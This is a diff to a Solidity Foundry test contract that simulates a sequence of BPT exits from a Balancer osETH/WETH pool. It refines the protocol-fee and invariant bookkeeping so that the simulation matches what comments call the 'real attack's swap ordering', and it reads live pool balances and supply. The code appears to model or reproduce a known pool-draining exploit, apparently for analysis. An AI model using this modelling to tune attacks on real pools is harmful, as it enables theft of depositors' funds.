@@ -597,11 +597,13 @@ contract SearchParams is Test {
         uint256 bO = realOSETH;
         uint256 supply = bptSupply;
 
-        // Use the fresh invariant from current balances for all steps.
-        // The real Balancer _beforeJoinExit updates the stored invariant to freshInvariant
-        // before the first swap, so step 0 uses freshInvariant as preJoinExitInvariant.
-        // (The stored _lastPostJoinExitInvariant may reflect an older osETH rate and would
-        //  be significantly lower than fresh, causing over-estimation of protocol fees.)
+        // storedInvariant mirrors the on-chain `_lastPostJoinExitInvariant` slot.
+        // Initial value is the fresh invariant at tx start: when bptSupply == getActualSupply(),
+        // the historical pre-tx fee has already been minted into supply, so the step-0 call to
+        // _calcBeforeSwapFeeBpt MUST return 0 (delta = 0). After step 0, _updateOldRates()
+        // syncs oldRate to currentRate, so for steps 1..N the swapFeeGrowthInvariant equals
+        // the freshInvariant from raw balances, validating the single-invariant collapse.
+        uint256 storedInvariant = _getInvariant(bW, bO);
 
         // Interleave: alternate WETH and osETH exits (matching real attack's swap ordering)
         uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
@@ -609,6 +611,8 @@ contract SearchParams is Test {
             // WETH exit: BPT → WETH (GIVEN_OUT, amount = token output desired)
             if (i < wethCount) {
                 uint256 preInvariant = _getInvariant(bW, bO);
+                // Between-swap fee (mirrors _payProtocolFeesBeforeJoinExit)
+                supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
                 uint256 preSupply = supply;
 
                 uint256 tokenOut = wethAmounts[i];
@@ -629,11 +633,14 @@ contract SearchParams is Test {
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                 supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                 // Track the stored invariant (mirrors _updatePostJoinExit)
+                storedInvariant = postInv;
                 lastPostJoinExitInvariant = postInv;
             }
             // osETH exit: BPT → osETH (GIVEN_OUT)
             if (i < osethCount) {
                 uint256 preInvariant = _getInvariant(bW, bO);
+                // Between-swap fee (mirrors _payProtocolFeesBeforeJoinExit)
+                supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
                 uint256 preSupply = supply;
 
                 uint256 tokenOut = osethAmounts[i];
@@ -654,6 +661,7 @@ contract SearchParams is Test {
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                 supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                 // Track the stored invariant (mirrors _updatePostJoinExit)
+                storedInvariant = postInv;
                 lastPostJoinExitInvariant = postInv;
             }
         }
@@ -719,10 +727,27 @@ contract SearchParams is Test {
 
     /// @notice Calculate protocol fee BPT minted by _payProtocolFeesBeforeJoinExit between
     /// consecutive BPT swaps within the same transaction.
-    /// Within a single tx (rates unchanged), the three growth invariants collapse to
-    /// freshInvariant, so the formula simplifies to:
-    ///   ownership = (freshInv - storedInv).divDown(freshInv).mulDown(protocolSwapFeePercentage)
-    ///   feeBpt = supply * ownership / complement(ownership)
+    ///
+    /// Official _getProtocolPoolOwnershipPercentage computes three invariants:
+    ///   swapFeeGrowthInvariant     = _calculateInvariant(amp, _getAdjustedBalances(b, true))
+    ///   totalNonExemptGrowthInv    = _calculateInvariant(amp, _getAdjustedBalances(b, false))
+    ///   totalGrowthInvariant       = _calculateInvariant(amp, b)
+    /// where _getAdjustedBalances applies (oldRate / currentRate) to rate-providing tokens.
+    ///
+    /// Justification for the single-invariant collapse used here:
+    ///   _updatePostJoinExit() calls _updateOldRates() after EVERY BPT join/exit, syncing
+    ///   oldRate ← currentRate. So for every BPT swap AFTER the first one in a tx, the
+    ///   adjustment factor (oldRate/currentRate) == 1, _getAdjustedBalances is the identity,
+    ///   and all three invariants collapse to _calculateInvariant(amp, b) == freshInvariant.
+    ///   The non-exempt yield delta therefore vanishes, so only the swap-fee component
+    ///   contributes:
+    ///     ownership = (freshInv - storedInv).divDown(freshInv).mulDown(protocolSwapFeePercentage)
+    ///     feeBpt    = supply * ownership / complement(ownership)
+    ///
+    /// For step 0 of a tx, oldRate may differ from currentRate (yield drift since last
+    /// join/exit). Callers must initialize storedInvariant such that the step-0 call
+    /// returns 0 — see the comment in _simulateStep1Extraction. This is mathematically
+    /// equivalent to using getActualSupply() (which has already paid that historical fee).
     function _calcBeforeSwapFeeBpt(
         uint256 freshInvariant,
         uint256 lastPostJoinExitInvariant,
@@ -1502,28 +1527,40 @@ contract SearchParams is Test {
 
         Step1BalState memory s = Step1BalState({bW: realWETH, bO: realOSETH, supply: bptSupply});
 
-        // Use fresh invariant from current balances for all steps (matches _simulateStep1Extraction).
+        // storedInvariant mirrors the on-chain `_lastPostJoinExitInvariant` slot; see the
+        // matching block in _simulateStep1Extraction for the rate-cache rationale.
+        uint256 storedInvariant = _getInvariant(s.bW, s.bO);
 
         uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
         for (uint256 i = 0; i < maxSwaps; i++) {
             if (i < wethCount) {
                 uint256 preInv = _getInvariant(s.bW, s.bO);
+                // Between-swap fee (mirrors _payProtocolFeesBeforeJoinExit)
+                uint256 beforeFee = _calcBeforeSwapFeeBpt(preInv, storedInvariant, s.supply);
+                s.supply += beforeFee;
                 uint256 bptIn;
                 uint256 postInv;
                 (s.bW, s.supply, bptIn, postInv) = _doSingleExitStep(s.bW, s.bO, s.supply, 0, wethAmounts[i], preInv);
                 r.totalBptSold += bptIn;
                 r.totalWethOut += wethAmounts[i];
+                storedInvariant = postInv;
                 r.lastPostJoinExitInvariant = postInv;
+                if (beforeFee > 0) console.log("[SP1] step", i, "WETH beforeSwapFeeBpt:", beforeFee);
                 console.log("[SP1] step", i, "WETH supply_after:", s.supply);
             }
             if (i < osethCount) {
                 uint256 preInv = _getInvariant(s.bW, s.bO);
+                // Between-swap fee (mirrors _payProtocolFeesBeforeJoinExit)
+                uint256 beforeFee = _calcBeforeSwapFeeBpt(preInv, storedInvariant, s.supply);
+                s.supply += beforeFee;
                 uint256 bptIn;
                 uint256 postInv;
                 (s.bO, s.supply, bptIn, postInv) = _doSingleExitStep(s.bW, s.bO, s.supply, 1, osethAmounts[i], preInv);
                 r.totalBptSold += bptIn;
                 r.totalOsethOut += osethAmounts[i];
+                storedInvariant = postInv;
                 r.lastPostJoinExitInvariant = postInv;
+                if (beforeFee > 0) console.log("[SP1] step", i, "OSETH beforeSwapFeeBpt:", beforeFee);
                 console.log("[SP1] step", i, "OSETH supply_after:", s.supply);
             }
         }
@@ -1617,6 +1654,12 @@ contract SearchParams is Test {
         (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
         uint256 realWETH = realBal[0];
         uint256 realOSETH = realBal[2];
+        // getActualSupply() = virtualSupply + dueProtocolFeeBpt, where dueProtocolFeeBpt is
+        // computed via the same _payProtocolFeesBeforeJoinExit formula the contract would run
+        // before the first BPT swap of this tx. So using it as the simulation's starting supply
+        // implicitly pre-pays the historical (pre-tx) swap+yield fee, and the simulation's
+        // initial storedInvariant = freshInvariant guarantees the step-0 between-swap fee is 0
+        // (no double-counting). See _calcBeforeSwapFeeBpt and _simulateStep1Extraction.
         uint256 totalBPT = OSETH_BPT.getActualSupply();
 
         uint256 remain = 67000;
